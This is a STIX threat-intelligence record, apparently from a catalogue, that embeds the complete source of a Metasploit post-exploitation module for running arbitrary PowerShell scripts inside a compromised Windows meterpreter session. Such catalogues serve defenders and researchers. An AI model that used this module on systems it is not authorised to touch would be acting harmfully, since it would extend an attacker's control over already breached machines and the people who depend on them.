{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47037254-20a3-4052-85f9-af5b1cddc85b",
    "created": "2024-08-14T16:33:04.971381Z",
    "modified": "2024-08-14T16:33:04.971385Z",
    "name": "Windows Powershell Execution Post Module",
    "description": " This module will execute a powershell script in a meterpreter session. The user may also enter text substitutions to be made in memory before execution. Setting VERBOSE to true will output both the script prior to execution and the results.  'License' => MSF_LICENSE 'Platform' => ['windows'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/exec_powershell.rb",
            "external_id": "exec_powershell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Powershell Execution Post Module',\n        'Description' => %q{\n          This module will execute a powershell script in a meterpreter session.\n          The user may also enter text substitutions to be made in memory before execution.\n          Setting VERBOSE to true will output both the script prior to execution and the results.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['windows'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script\n          'RageLtMan <rageltman[at]sempervictus>' # post module and libs\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SCRIPT', [true, 'Path to the local PS script or command string to execute']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub']),\n      ]\n    )\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script, note no need to return\n    # unless error\n    raise 'Powershell not available' if !have_powershell?\n\n    # Preprocess the Powershell::Script object with substitions from Exploit::Powershell\n    script = make_subs(read_script(datastore['SCRIPT']), process_subs(datastore['SUBSTITUTIONS']))\n\n    # Execute in session\n    print_status psh_exec(script)\n    print_good 'Finished!'\n  end\nend\n"
}